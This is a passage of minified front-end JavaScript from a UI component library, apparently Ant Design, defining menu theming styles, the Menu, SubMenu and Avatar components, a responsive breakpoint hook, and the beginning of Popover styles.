${r}`]:{backgroundColor:T},[`&${r}-submenu-popup > ${r}`]:{backgroundColor:T},[`&${r}-horizontal`]:{..."dark"===t?{borderBottom:0}:{},[`> ${r}-item, > ${r}-submenu`]:{top:p,marginTop:e.calc(p).mul(-1).equal(),marginBottom:0,borderRadius:_,"&::after":{position:"absolute",insetInline:h,bottom:0,borderBottom:`${(0,P.unit)(u)} solid transparent`,transition:`border-color ${m} ${f}`,content:'""'},"&:hover, &-active, &-open":{background:O,"&::after":{borderBottomWidth:u,borderBottomColor:A}},"&-selected":{color:A,backgroundColor:L,"&:hover":{backgroundColor:L},"&::after":{borderBottomWidth:u,borderBottomColor:A}}}},[`&${r}-root`]:{[`&${r}-inline, &${r}-vertical`]:{borderInlineEnd:`${(0,P.unit)(p)} ${y} ${S}`}},[`&${r}-inline`]:{[`${r}-sub${r}-inline`]:{background:l},[`${r}-item`]:{position:"relative","&::after":{position:"absolute",insetBlock:0,insetInlineEnd:0,borderInlineEnd:`${(0,P.unit)(d)} solid ${n}`,transform:"scaleY(0.0001)",opacity:0,transition:["transform","opacity"].map(e=>`${e} ${v} ${g}`).join(","),content:'""'},[`&${r}-item-danger`]:{"&::after":{borderInlineEndColor:k}}},[`${r}-selected, ${r}-item-selected`]:{"&::after":{transform:"scaleY(1)",opacity:1,transition:["transform","opacity"].map(e=>`${e} ${v} ${f}`).join(",")}}}}}},_=e=>{let{componentCls:t,itemHeight:r,itemMarginInline:o,padding:n,menuArrowSize:a,marginXS:i,itemMarginBlock:s,itemWidth:l,itemPaddingInline:c}=e,u=e.calc(a).add(n).add(i).equal();return{[`${t}-item`]:{position:"relative",overflow:"hidden"},[`${t}-item, ${t}-submenu-title`]:{height:r,lineHeight:(0,P.unit)(r),paddingInline:c,overflow:"hidden",textOverflow:"ellipsis",marginInline:o,marginBlock:s,width:l},[`> ${t}-item,
            > ${t}-submenu > ${t}-submenu-title`]:{height:r,lineHeight:(0,P.unit)(r)},[`${t}-item-group-list ${t}-submenu-title,
            ${t}-submenu-title`]:{paddingInlineEnd:u}}},O=e=>{let{componentCls:t,motionDurationSlow:r,motionDurationMid:o,motionEaseInOut:n,motionEaseOut:a,iconCls:i,iconSize:s,iconMarginInlineEnd:l}=e;return{[`${t}-item, ${t}-submenu-title`]:{position:"relative",display:"block",margin:0,whiteSpace:"nowrap",cursor:"pointer",transition:`border-color ${r},background-color ${r},padding calc(${r} + 0.1s) ${n}`,[`${t}-item-icon, ${i}`]:{minWidth:s,fontSize:s,transition:`font-size ${o} ${a},margin ${r} ${n},color ${r}`,"+ span":{marginInlineStart:l,opacity:1,transition:`opacity ${r} ${n},margin ${r},color ${r}`}},[`${t}-item-icon`]:{...(0,E.resetIcon)()},[`&${t}-item-only-child`]:{[`> ${i}, > ${t}-item-icon`]:{marginInlineEnd:0}}},[`${t}-item-disabled, ${t}-submenu-disabled`]:{background:"none !important",cursor:"not-allowed","&::after":{borderColor:"transparent !important"},a:{color:"inherit !important",cursor:"not-allowed",pointerEvents:"none"},[`> ${t}-submenu-title`]:{color:"inherit !important",cursor:"not-allowed"}}}},j=e=>{let{componentCls:t,motionDurationSlow:r,motionEaseInOut:o,borderRadius:n,menuArrowSize:a,menuArrowOffset:i}=e;return{[`${t}-submenu`]:{"&-expand-icon, &-arrow":{position:"absolute",top:"50%",insetInlineEnd:e.margin,width:a,color:"currentcolor",transform:"translateY(-50%)",transition:["transform","opacity"].map(e=>`${e} ${r}`).join(",")},"&-arrow":{"&::before, &::after":{position:"absolute",width:e.calc(a).mul(.6).equal(),height:e.calc(a).mul(.15).equal(),backgroundColor:"currentcolor",borderRadius:n,transition:["background-color","transform","top","color"].map(e=>`${e} ${r} ${o}`).join(","),content:'""'},"&::before":{transform:`rotate(45deg) translateY(${(0,P.unit)(e.calc(i).mul(-1).equal())})`},"&::after":{transform:`rotate(-45deg) translateY(${(0,P.unit)(i)})`}}}}},F=e=>{let{colorPrimary:t,colorError:r,colorTextDisabled:o,colorErrorBg:n,colorText:a,colorTextDescription:i,colorBgContainer:s,colorFillAlter:l,colorFillContent:c,lineWidth:u,lineWidthBold:d,controlItemBgActive:p,colorBgTextHover:m,controlHeightLG:f,lineHeight:g,colorBgElevated:h,marginXXS:v,padding:b,fontSize:y,controlHeightSM:S,fontSizeLG:x,colorTextLightSolid:C,colorErrorHover:w}=e,k=e.activeBarWidth??0,P=e.activeBarBorderWidth??u,E=e.itemMarginInline??e.marginXXS,T=new $.FastColor(C).setA(.65).toRgbString();return{dropdownWidth:160,zIndexPopup:e.zIndexPopupBase+50,radiusItem:e.borderRadiusLG,itemBorderRadius:e.borderRadiusLG,radiusSubMenuItem:e.borderRadiusSM,subMenuItemBorderRadius:e.borderRadiusSM,colorItemText:a,itemColor:a,colorItemTextHover:a,itemHoverColor:a,colorItemTextHoverHorizontal:t,horizontalItemHoverColor:t,colorGroupTitle:i,groupTitleColor:i,colorItemTextSelected:t,itemSelectedColor:t,subMenuItemSelectedColor:t,colorItemTextSelectedHorizontal:t,horizontalItemSelectedColor:t,colorItemBg:s,itemBg:s,colorItemBgHover:m,itemHoverBg:m,colorItemBgActive:c,itemActiveBg:p,colorSubItemBg:l,subMenuItemBg:l,colorItemBgSelected:p,itemSelectedBg:p,colorItemBgSelectedHorizontal:"transparent",horizontalItemSelectedBg:"transparent",colorActiveBarWidth:0,activeBarWidth:k,colorActiveBarHeight:d,activeBarHeight:d,colorActiveBarBorderSize:u,activeBarBorderWidth:P,colorItemTextDisabled:o,itemDisabledColor:o,colorDangerItemText:r,dangerItemColor:r,colorDangerItemTextHover:r,dangerItemHoverColor:r,colorDangerItemTextSelected:r,dangerItemSelectedColor:r,colorDangerItemBgActive:n,dangerItemActiveBg:n,colorDangerItemBgSelected:n,dangerItemSelectedBg:n,itemMarginInline:E,horizontalItemBorderRadius:0,horizontalItemHoverBg:"transparent",itemHeight:f,groupTitleLineHeight:g,collapsedWidth:2*f,popupBg:h,itemMarginBlock:v,itemPaddingInline:b,horizontalLineHeight:`${1.15*f}px`,iconSize:y,iconMarginInlineEnd:S-y,collapsedIconSize:x,groupTitleFontSize:y,darkItemDisabledColor:new $.FastColor(C).setA(.25).toRgbString(),darkItemColor:T,darkDangerItemColor:r,darkItemBg:"#001529",darkPopupBg:"#001529",darkSubMenuItemBg:"#000c17",darkItemSelectedColor:C,darkItemSelectedBg:t,darkDangerItemSelectedBg:r,darkItemHoverBg:"transparent",darkGroupTitleColor:T,darkItemHoverColor:C,darkDangerItemHoverColor:w,darkDangerItemSelectedColor:C,darkDangerItemActiveBg:r,itemWidth:k?`calc(100% + ${P}px)`:`calc(100% - ${2*E}px)`}};var N=e.i(4079),N=N,V=e.i(60698),B=e.i(22767);let H=e=>{let r,{popupClassName:o,icon:n,title:a,theme:s}=e,c=t.useContext(f),{prefixCls:u,inlineCollapsed:p,theme:m,classNames:g,styles:h}=c,v=(0,V.useFullPath)();if(n){let e=t.isValidElement(a)&&"span"===a.type;r=t.createElement(t.Fragment,null,(0,d.cloneElement)(n,e=>({className:(0,l.clsx)(e.className,`${u}-item-icon`,g?.itemIcon),style:{...e.style,...h?.itemIcon}})),e?a:t.createElement("span",{className:`${u}-title-content`},a))}else r=p&&!v.length&&a&&"string"==typeof a?t.createElement("div",{className:`${u}-inline-collapsed-noicon`},a.charAt(0)):t.createElement("span",{className:`${u}-title-content`},a);let b=t.useMemo(()=>({...c,firstLevel:!1}),[c]),[y]=(0,B.useZIndex)("Menu");return t.createElement(f.Provider,{value:b},t.createElement(N.default,{...(0,i.omit)(e,["icon"]),title:r,classNames:{list:g?.subMenu?.list,listTitle:g?.subMenu?.itemTitle},styles:{list:h?.subMenu?.list,listTitle:h?.subMenu?.itemTitle},popupClassName:(0,l.clsx)(u,o,g?.popup?.root,`${u}-${s||m}`),popupStyle:{zIndex:y,...e.popupStyle,...h?.popup?.root}}))};function z(e){return null===e||!1===e}let U={item:S,submenu:H,divider:h},W=(0,t.forwardRef)((e,o)=>{let n=t.useContext(w),g=n||{},{prefixCls:h,className:v,style:b,theme:y="light",expandIcon:S,_internalDisableMenuItemTitleTooltip:x,tooltip:C,inlineCollapsed:k,siderCollapsed:$,rootClassName:D,mode:N,selectable:V,onClick:B,overflowedIndicatorPopupClassName:H,classNames:W,styles:q,...G}=e,{menu:J}=t.useContext(p.ConfigContext),{getPrefixCls:X,getPopupContainer:K,direction:Q,className:Y,style:Z,classNames:ee,styles:et}=(0,p.useComponentConfig)("menu"),er=X(),eo=(0,i.omit)(G,["collapsedWidth"]);g.validator?.({mode:N});let en=(0,s.useEvent)((...e)=>{B?.(...e),g.onClick?.()}),ea=g.mode||N,ei=V??g.selectable,es=k??$,el={...e,mode:ea,inlineCollapsed:es,selectable:ei,theme:y},[ec,eu]=(0,c.useMergeSemantic)([ee,W],[et,q],{props:el},{popup:{_default:"root"},subMenu:{_default:"item"}}),ed={horizontal:{motionName:`${er}-slide-up`},inline:(0,u.default)(er),other:{motionName:`${er}-zoom-big`}},ep=X("menu",h||g.prefixCls),em=(0,m.default)(ep),[ef,eg]=((e,t=e,r=!0)=>(0,M.genStyleHooks)("Menu",e=>{let{colorBgElevated:t,controlHeightLG:r,fontSize:o,darkItemColor:n,darkDangerItemColor:a,darkItemBg:i,darkSubMenuItemBg:s,darkItemSelectedColor:l,darkItemSelectedBg:c,darkDangerItemSelectedBg:u,darkItemHoverBg:d,darkGroupTitleColor:p,darkItemHoverColor:m,darkItemDisabledColor:f,darkDangerItemHoverColor:g,darkDangerItemSelectedColor:h,darkDangerItemActiveBg:v,popupBg:b,darkPopupBg:y}=e,S=e.calc(o).div(7).mul(5).equal(),x=(0,A.mergeToken)(e,{menuArrowSize:S,menuHorizontalHeight:e.calc(r).mul(1.15).equal(),menuArrowOffset:e.calc(S).mul(.25).equal(),menuSubMenuBg:t,calc:e.calc,popupBg:b}),C=(0,A.mergeToken)(x,{itemColor:n,itemHoverColor:m,groupTitleColor:p,itemSelectedColor:l,subMenuItemSelectedColor:l,itemBg:i,popupBg:y,subMenuItemBg:s,itemActiveBg:"transparent",itemSelectedBg:c,activeBarHeight:0,activeBarBorderWidth:0,itemHoverBg:d,itemDisabledColor:f,dangerItemColor:a,dangerItemHoverColor:g,dangerItemSelectedColor:h,dangerItemActiveBg:v,dangerItemSelectedBg:u,menuSubMenuBg:s,horizontalItemSelectedColor:l,horizontalItemSelectedBg:c});return[(e=>{let{antCls:t,componentCls:r,fontSize:o,motionDurationSlow:n,motionDurationMid:a,motionEaseInOut:i,paddingXS:s,padding:l,colorSplit:c,lineWidth:u,zIndexPopup:d,borderRadiusLG:p,subMenuItemBorderRadius:m,menuArrowSize:f,menuArrowOffset:g,lineType:h,groupTitleLineHeight:v,groupTitleFontSize:b}=e;return[{"":{[r]:{...(0,E.clearFix)(),"&-hidden":{display:"none"}}},[`${r}-submenu-hidden`]:{display:"none"}},{[r]:{...(0,E.resetComponent)(e),...(0,E.clearFix)(),marginBottom:0,paddingInlineStart:0,fontSize:o,lineHeight:0,listStyle:"none",outline:"none",transition:`width ${n} cubic-bezier(0.2, 0, 0, 1) 0s`,"ul, ol":{margin:0,padding:0,listStyle:"none"},"&-overflow":{display:"flex",[`${r}-item`]:{flex:"none"}},[`${r}-item, ${r}-submenu, ${r}-submenu-title`]:{borderRadius:e.itemBorderRadius},[`${r}-item-group-title`]:{padding:`${(0,P.unit)(s)} ${(0,P.unit)(l)}`,fontSize:b,lineHeight:v,transition:`all ${n}`},[`&-horizontal ${r}-submenu`]:{transition:["border-color","background-color"].map(e=>`${e} ${n} ${i}`).join(",")},[`${r}-submenu, ${r}-submenu-inline`]:{transition:[`border-color ${n}`,`background-color ${n}`,`padding ${a}`].map(e=>`${e} ${i}`).join(",")},[`${r}-submenu ${r}-sub`]:{cursor:"initial",transition:["background-color","padding"].map(e=>`${e} ${n} ${i}`).join(",")},[`${r}-title-content`]:{transition:`color ${n}`,"&-with-extra":{display:"inline-flex",alignItems:"center",width:"100%"},[`> ${t}-typography-ellipsis-single-line`]:{display:"inline",verticalAlign:"unset"},[`${r}-item-extra`]:{marginInlineStart:"auto",paddingInlineStart:e.padding}},[`${r}-item a`]:{"&::before":{position:"absolute",inset:0,backgroundColor:"transparent",content:'""'}},[`${r}-item-divider`]:{overflow:"hidden",lineHeight:0,borderColor:c,borderStyle:h,borderWidth:0,borderTopWidth:u,marginBlock:u,padding:0,"&-dashed":{borderStyle:"dashed"}},...O(e),[`${r}-item-group`]:{[`${r}-item-group-list`]:{margin:0,padding:0,[`${r}-item, ${r}-submenu-title`]:{paddingInline:`${(0,P.unit)(e.calc(o).mul(2).equal())} ${(0,P.unit)(l)}`}}},"&-submenu":{"&-popup":{position:"absolute",zIndex:d,borderRadius:p,boxShadow:"none",transformOrigin:"0 0",[`&${r}-submenu`]:{background:"transparent"},"&::before":{position:"absolute",inset:0,zIndex:-1,width:"100%",height:"100%",opacity:0,content:'""'},[`> ${r}`]:{borderRadius:p,...O(e),...j(e),[`${r}-item, ${r}-submenu > ${r}-submenu-title`]:{borderRadius:m},[`${r}-submenu-title::after`]:{transition:`transform ${n} ${i}`}}},[`
          &-placement-leftTop,
          &-placement-bottomRight,
          `]:{transformOrigin:"100% 0"},[`
          &-placement-leftBottom,
          &-placement-topRight,
          `]:{transformOrigin:"100% 100%"},[`
          &-placement-rightBottom,
          &-placement-topLeft,
          `]:{transformOrigin:"0 100%"},[`
          &-placement-bottomLeft,
          &-placement-rightTop,
          `]:{transformOrigin:"0 0"},[`
          &-placement-leftTop,
          &-placement-leftBottom
          `]:{paddingInlineEnd:e.paddingXS},[`
          &-placement-rightTop,
          &-placement-rightBottom
          `]:{paddingInlineStart:e.paddingXS},[`
          &-placement-topRight,
          &-placement-topLeft
          `]:{paddingBottom:e.paddingXS},[`
          &-placement-bottomRight,
          &-placement-bottomLeft
          `]:{paddingTop:e.paddingXS}},...j(e),[`&-inline-collapsed ${r}-submenu-arrow,
        &-inline ${r}-submenu-arrow`]:{"&::before":{transform:`rotate(-45deg) translateX(${(0,P.unit)(g)})`},"&::after":{transform:`rotate(45deg) translateX(${(0,P.unit)(e.calc(g).mul(-1).equal())})`}},[`${r}-submenu-open${r}-submenu-inline > ${r}-submenu-title > ${r}-submenu-arrow`]:{transform:`translateY(${(0,P.unit)(e.calc(f).mul(.2).mul(-1).equal())})`,"&::after":{transform:`rotate(-45deg) translateX(${(0,P.unit)(e.calc(g).mul(-1).equal())})`},"&::before":{transform:`rotate(45deg) translateX(${(0,P.unit)(g)})`}}}},{[`${t}-layout-header`]:{[r]:{lineHeight:"inherit"}}}]})(x),(e=>{let{componentCls:t,motionDurationSlow:r,horizontalLineHeight:o,colorSplit:n,lineWidth:a,lineType:i,itemPaddingInline:s}=e;return{[`${t}-horizontal`]:{lineHeight:o,border:0,borderBottom:`${(0,P.unit)(a)} ${i} ${n}`,boxShadow:"none","&::after":{display:"block",clear:"both",height:0,content:'"\\20"'},[`${t}-item, ${t}-submenu`]:{position:"relative",display:"inline-block",verticalAlign:"bottom",paddingInline:s},[`> ${t}-item:hover,
        > ${t}-item-active,
        > ${t}-submenu ${t}-submenu-title:hover`]:{backgroundColor:"transparent"},[`${t}-item, ${t}-submenu-title`]:{transition:["border-color","background-color"].map(e=>`${e} ${r}`).join(",")},[`${t}-submenu-arrow`]:{display:"none"}}}})(x),(e=>{let{componentCls:t,iconCls:r,itemHeight:o,colorTextLightSolid:n,dropdownWidth:a,controlHeightLG:i,motionEaseOut:s,paddingXL:l,itemMarginInline:c,fontSizeLG:u,motionDurationFast:d,motionDurationSlow:p,paddingXS:m,boxShadowSecondary:f,collapsedWidth:g,collapsedIconSize:h}=e,v={height:o,lineHeight:(0,P.unit)(o),listStylePosition:"inside",listStyleType:"disc"};return[{[t]:{"&-inline, &-vertical":{[`&${t}-root`]:{boxShadow:"none"},..._(e)}},[`${t}-submenu-popup`]:{[`${t}-vertical`]:{..._(e),boxShadow:f}}},{[`${t}-submenu-popup ${t}-vertical${t}-sub`]:{minWidth:a,maxHeight:`calc(100vh - ${(0,P.unit)(e.calc(i).mul(2.5).equal())})`,padding:"0",overflow:"hidden",borderInlineEnd:0,"&:not([class*='-active'])":{overflowX:"hidden",overflowY:"auto"}}},{[`${t}-inline`]:{width:"100%",[`&${t}-root`]:{[`${t}-item, ${t}-submenu-title`]:{display:"flex",alignItems:"center",transition:`border-color ${p},background-color ${p},padding ${d} ${s}`,[`> ${t}-title-content`]:{flex:"auto",minWidth:0,overflow:"hidden",textOverflow:"ellipsis"},"> *":{flex:"none"}}},[`${t}-sub${t}-inline`]:{padding:0,border:0,borderRadius:0,boxShadow:"none",[`& > ${t}-submenu > ${t}-submenu-title`]:v,[`& ${t}-item-group-title`]:{paddingInlineStart:l}},[`${t}-item`]:v}},{[`${t}-inline-collapsed`]:{width:g,[`&${t}-root`]:{[`${t}-item, ${t}-submenu ${t}-submenu-title`]:{[`> ${t}-inline-collapsed-noicon`]:{fontSize:u,textAlign:"center"}}},[`> ${t}-item,
          > ${t}-item-group > ${t}-item-group-list > ${t}-item,
          > ${t}-item-group > ${t}-item-group-list > ${t}-submenu > ${t}-submenu-title,
          > ${t}-submenu > ${t}-submenu-title`]:{insetInlineStart:0,paddingInline:`calc(50% - ${(0,P.unit)(e.calc(h).div(2).equal())} - ${(0,P.unit)(c)})`,textOverflow:"clip",[`
            ${t}-submenu-arrow,
            ${t}-submenu-expand-icon
          `]:{opacity:0},[`${t}-item-icon, ${r}`]:{margin:0,fontSize:h,lineHeight:(0,P.unit)(o),"+ span":{display:"inline-block",opacity:0}}},[`${t}-item-icon, ${r}`]:{display:"inline-block"},"&-tooltip":{pointerEvents:"none",[`${t}-item-icon, ${r}`]:{display:"none"},"a, a:hover":{color:n}},[`${t}-item-group-title`]:{...E.textEllipsis,paddingInline:m}}}]})(x),L(x,"light"),L(C,"dark"),(({componentCls:e,menuArrowOffset:t,calc:r})=>({[`${e}-rtl`]:{direction:"rtl"},[`${e}-submenu-rtl`]:{transformOrigin:"100% 0"},[`${e}-rtl${e}-vertical,
    ${e}-submenu-rtl ${e}-vertical`]:{[`${e}-submenu-arrow`]:{"&::before":{transform:`rotate(-45deg) translateY(${(0,P.unit)(r(t).mul(-1).equal())})`},"&::after":{transform:`rotate(45deg) translateY(${(0,P.unit)(t)})`}}}}))(x),(0,T.genCollapseMotion)(x),(0,I.initSlideMotion)(x,"slide-up"),(0,I.initSlideMotion)(x,"slide-down"),(0,R.initZoomMotion)(x,"zoom-big")]},F,{deprecatedTokens:[["colorGroupTitle","groupTitleColor"],["radiusItem","itemBorderRadius"],["radiusSubMenuItem","subMenuItemBorderRadius"],["colorItemText","itemColor"],["colorItemTextHover","itemHoverColor"],["colorItemTextHoverHorizontal","horizontalItemHoverColor"],["colorItemTextSelected","itemSelectedColor"],["colorItemTextSelectedHorizontal","horizontalItemSelectedColor"],["colorItemTextDisabled","itemDisabledColor"],["colorDangerItemText","dangerItemColor"],["colorDangerItemTextHover","dangerItemHoverColor"],["colorDangerItemTextSelected","dangerItemSelectedColor"],["colorDangerItemBgActive","dangerItemActiveBg"],["colorDangerItemBgSelected","dangerItemSelectedBg"],["colorItemBg","itemBg"],["colorItemBgHover","itemHoverBg"],["colorSubItemBg","subMenuItemBg"],["colorItemBgActive","itemActiveBg"],["colorItemBgSelectedHorizontal","horizontalItemSelectedBg"],["colorActiveBarWidth","activeBarWidth"],["colorActiveBarHeight","activeBarHeight"],["colorActiveBarBorderSize","activeBarBorderWidth"],["colorItemBgSelected","itemSelectedBg"]],injectStyle:r,unitless:{groupTitleLineHeight:!0}})(e,t))(ep,em,!n),eh=(0,l.clsx)(`${ep}-${y}`,Y,v),ev=t.useMemo(()=>{if("function"==typeof S||z(S))return S||null;if("function"==typeof g.expandIcon||z(g.expandIcon))return g.expandIcon||null;if("function"==typeof J?.expandIcon||z(J?.expandIcon))return J?.expandIcon||null;let e=S??g?.expandIcon??J?.expandIcon;return(0,d.cloneElement)(e,{className:(0,l.clsx)(`${ep}-submenu-expand-icon`,t.isValidElement(e)?e.props?.className:void 0)})},[S,g?.expandIcon,J?.expandIcon,ep]),eb=t.useMemo(()=>({prefixCls:ep,inlineCollapsed:es||!1,direction:Q,firstLevel:!0,theme:y,mode:ea,disableMenuItemTitleTooltip:x,tooltip:C,classNames:ec,styles:eu}),[ep,es,Q,x,y,ea,ec,eu,C]);return t.createElement(w.Provider,{value:null},t.createElement(f.Provider,{value:eb},t.createElement(r.default,{getPopupContainer:K,overflowedIndicator:t.createElement(a.default,null),overflowedIndicatorPopupClassName:(0,l.clsx)(ep,`${ep}-${y}`,H),classNames:{list:ec.list,listTitle:ec.itemTitle},styles:{list:eu.list,listTitle:eu.itemTitle},mode:ea,selectable:ei,onClick:en,...eo,inlineCollapsed:es,style:{...eu.root,...Z,...b},className:eh,prefixCls:ep,direction:Q,defaultMotions:ed,expandIcon:ev,ref:o,rootClassName:(0,l.clsx)(D,ef,g.rootClassName,eg,em,ec.root),_internalComponents:U})))}),q=(0,t.forwardRef)((e,r)=>{let o=(0,t.useRef)(null),a=t.useContext(n.SiderContext);return(0,t.useImperativeHandle)(r,()=>({menu:o.current,focus:e=>{o.current?.focus(e)}})),t.createElement(W,{ref:o,...e,...a})});q.Item=S,q.SubMenu=H,q.Divider=h,q.ItemGroup=o.default,e.s(["default",0,q],60699)},22140,52947,5330,e=>{"use strict";var t=e.i(43476),r=e.i(71645),o=e.i(22016),n=e.i(92989),a=e.i(60699),a=a,i=e.i(72943),s=e.i(98586);e.i(47167);var l=e.i(78052),c=e.i(32839),u=e.i(7670),d=e.i(4458);let p=["xxxl","xxl","xl","lg","md","sm","xs"];[].concat(p).reverse();var m=e.i(42064),f=e.i(21883),g=e.i(17455),h=e.i(1676);let v=function(e=!0,t={}){let o=(0,r.useRef)(t),[,n]=r.default.useReducer(e=>e+1,0),a=(()=>{let e,[,t]=(0,d.useToken)(),o=((e=[].concat(p).reverse()).forEach((r,o)=>{let n=r.toUpperCase(),a=`screen${n}Min`,i=`screen${n}`;if(!(t[a]<=t[i]))throw Error(`${a}<=${i} fails : !(${t[a]}<=${t[i]})`);if(o<e.length-1){let r=`screen${n}Max`;if(!(t[i]<=t[r]))throw Error(`${i}<=${r} fails : !(${t[i]}<=${t[r]})`);let a=e[o+1].toUpperCase(),s=`screen${a}Min`;if(!(t[r]<=t[s]))throw Error(`${r}<=${s} fails : !(${t[r]}<=${t[s]})`)}}),{xs:`(max-width: ${t.screenXSMax}px)`,sm:`(min-width: ${t.screenSM}px)`,md:`(min-width: ${t.screenMD}px)`,lg:`(min-width: ${t.screenLG}px)`,xl:`(min-width: ${t.screenXL}px)`,xxl:`(min-width: ${t.screenXXL}px)`,xxxl:`(min-width: ${t.screenXXXL}px)`});return r.default.useMemo(()=>{let e=new Map,t=-1,r={};return{responsiveMap:o,matchHandlers:{},dispatch:t=>(r=t,e.forEach(e=>e(r)),e.size>=1),subscribe(o){return e.size||this.register(),t+=1,e.set(t,o),o(r),t},unsubscribe(t){e.delete(t),e.size||this.unregister()},register(){Object.entries(o).forEach(([e,t])=>{let o=({matches:t})=>{this.dispatch({...r,[e]:t})},n=window.matchMedia(t);"function"==typeof n?.addEventListener&&n.addEventListener("change",o),this.matchHandlers[t]={mql:n,listener:o},o(n)})},unregister(){Object.values(o).forEach(e=>{let t=this.matchHandlers[e];"function"==typeof t?.mql?.removeEventListener&&t.mql.removeEventListener("change",t?.listener)}),e.clear()}}},[o])})();return(0,h.default)(()=>{let t=a.subscribe(t=>{o.current=t,e&&n()});return()=>a.unsubscribe(t)},[]),o.current},b=r.createContext({});e.i(96059);var y=e.i(15654),S=e.i(83293),x=e.i(46422),C=e.i(38378);let w=(0,x.genStyleHooks)("Avatar",e=>{let{colorTextLightSolid:t,colorTextPlaceholder:r}=e,o=(0,C.mergeToken)(e,{avatarBg:r,avatarColor:t});return[(e=>{let{antCls:t,componentCls:r,iconCls:o,avatarBg:n,avatarColor:a,containerSize:i,containerSizeLG:s,containerSizeSM:l,textFontSize:c,textFontSizeLG:u,textFontSizeSM:d,iconFontSize:p,iconFontSizeLG:m,iconFontSizeSM:f,borderRadius:g,borderRadiusLG:h,borderRadiusSM:v,lineWidth:b,lineType:x}=e,C=(e,t,n,a)=>({width:e,height:e,borderRadius:"50%",fontSize:t,[`&${r}-square`]:{borderRadius:a},[`&${r}-icon`]:{fontSize:n,[`> ${o}`]:{margin:0}}});return{[r]:{...(0,S.resetComponent)(e),position:"relative",display:"inline-flex",justifyContent:"center",alignItems:"center",overflow:"hidden",color:a,whiteSpace:"nowrap",textAlign:"center",verticalAlign:"middle",background:n,border:`${(0,y.unit)(b)} ${x} transparent`,"&-image":{background:"transparent"},[`${t}-image-img`]:{display:"block"},...C(i,c,p,g),"&-lg":{...C(s,u,m,h)},"&-sm":{...C(l,d,f,v)},"> img":{display:"block",width:"100%",height:"100%",objectFit:"cover"}}}})(o),(e=>{let{componentCls:t,groupBorderColor:r,groupOverlapping:o,groupSpace:n}=e;return{[`${t}-group`]:{display:"inline-flex",[t]:{borderColor:r},"> *:not(:first-child)":{marginInlineStart:o}},[`${t}-group-popover`]:{[`${t} + ${t}`]:{marginInlineStart:n}}}})(o)]},e=>{let{controlHeight:t,controlHeightLG:r,controlHeightSM:o,fontSize:n,fontSizeLG:a,fontSizeXL:i,fontSizeHeading3:s,marginXS:l,marginXXS:c,colorBorderBg:u}=e;return{containerSize:t,containerSizeLG:r,containerSizeSM:o,textFontSize:n,textFontSizeLG:n,textFontSizeSM:n,iconFontSize:Math.round((a+i)/2),iconFontSizeLG:s,iconFontSizeSM:n,groupSpace:c,groupOverlapping:-l,groupBorderColor:u}}),k=r.forwardRef((e,t)=>{let o,{prefixCls:n,shape:a,size:i,src:s,srcSet:d,icon:h,className:y,rootClassName:S,style:x,alt:C,draggable:k,children:P,crossOrigin:$,gap:E=4,onError:T,...I}=e,[R,M]=r.useState(1),[A,D]=r.useState(!1),[L,_]=r.useState(!0),O=r.useRef(null),j=r.useRef(null),F=(0,c.composeRef)(t,O),{getPrefixCls:N,className:V,style:B}=(0,m.useComponentConfig)("avatar"),H=r.useContext(b),z=()=>{if(!j.current||!O.current)return;let e=j.current.offsetWidth,t=O.current.offsetWidth;0!==e&&0!==t&&2*E<t&&M(t-2*E<e?(t-2*E)/e:1)};r.useEffect(()=>{D(!0)},[]),r.useEffect(()=>{_(!0),M(1)},[s]),r.useEffect(z,[E]);let U=(0,g.default)(e=>i??H?.size??e??"medium"),W=v(Object.keys("object"==typeof U&&U||{}).some(e=>p.includes(e))),q=r.useMemo(()=>{if("object"!=typeof U)return{};let e=U[p.find(e=>W[e])];return e?{width:e,height:e,fontSize:e&&(h||P)?e/2:18}:{}},[W,U,h,P]),G=N("avatar",n),J=(0,f.default)(G),[X,K]=w(G,J),Q=(0,u.clsx)({[`${G}-lg`]:"large"===U,[`${G}-sm`]:"small"===U}),Y=r.isValidElement(s),Z=a||H?.shape||"circle",ee=(0,u.clsx)(G,Q,V,`${G}-${Z}`,{[`${G}-image`]:Y||s&&L,[`${G}-icon`]:!!h},K,J,y,S,X),et="number"==typeof U?{width:U,height:U,fontSize:h?U/2:18}:{};if("string"==typeof s&&L)o=r.createElement("img",{src:s,draggable:k,srcSet:d,onError:()=>{!1!==T?.()&&_(!1)},alt:C,crossOrigin:$});else if(Y)o=s;else if(h)o=h;else if(A||1!==R){let e=`scale(${R})`;o=r.createElement(l.default,{onResize:z},r.createElement("span",{className:`${G}-string`,ref:j,style:{msTransform:e,WebkitTransform:e,transform:e}},P))}else o=r.createElement("span",{className:`${G}-string`,style:{opacity:0},ref:j},P);return r.createElement("span",{...I,style:{...et,...q,...B,...x},className:ee,ref:F},o)});e.i(63335);var P=e.i(43081),$=e.i(63731),E=e.i(30294);let T=e=>e?"function"==typeof e?e():e:null;var I=e.i(11517),R=e.i(13541),M=e.i(91816),A=e.i(96158);e.i(37908);var D=e.i(92656),L=e.i(17356),_=e.i(20560),O=e.i(7358),j=e.i(17933);let F=(0,x.genStyleHooks)("Popover",e=>{let{colorBgElevated:t,colorText:r}=e,o=(0,C.mergeToken)(e,{popoverBg:t,popoverColor:r});return[(e=>{let{componentCls:t,popoverColor:r,titleMinWidth:o,fontWeightStrong:n,innerPadding:a,boxShadowSecondary:i,colorTextHeading:s,borderRadiusLG:l,zIndexPopup:c,titleMarginBottom:u,colorBgElevated:d,popoverBg:p,titleBorderBottom:m,innerContentPadding:f,titlePadding:g,antCls:h}=e,[v,b]=(0,x.genCssVar)(h,"tooltip");return[{[t]:{...(0,S.resetComponent)(e),position:"absolute",top:0,left:{_skip_check_:!0,value:0},zIndex:c,fontWeight:"normal",whiteSpace:"normal",textAlign:"start",cursor:"auto",userSelect:"text",[v("valid-offset-x")]:b("arrow-offset-x","var(--arrow-x)"),transformOrigin:[b("valid-offset-x","50%"),"var(--arrow-y, 50%)"].join(" "),[v("arrow-background-color")]:d,width:"max-content",maxWidth:"100vw","&-rtl":{direction:"rtl"},"&-hidden":{display:"none"},[`${t}-content`]:{position:"relative"},[`${t}-container`]:{backgroundColor:p,backgroundClip:"padding-box",borderRadius:l,boxShadow:i,padding:a},[`${t}-title`]:{minWidth:o,marginBottom:u,color:s,fontWeight:n,borderBottom:m,padding:g},[`${t}-content`]:{color:r,padding:f}}},(0,_.default)(e,b("arrow-background-color")),{[`${t}-pure`]:{position:"relative",maxWidth:"none",margin:e.sizePopupArrow,display:"inline-block"}}]})(o),(e=>{let{componentCls:t,antCls:r}=e,[o]=(0,x.genCssVar)(r,"tooltip");return{[t]:j.PresetColors.map(r=>{let 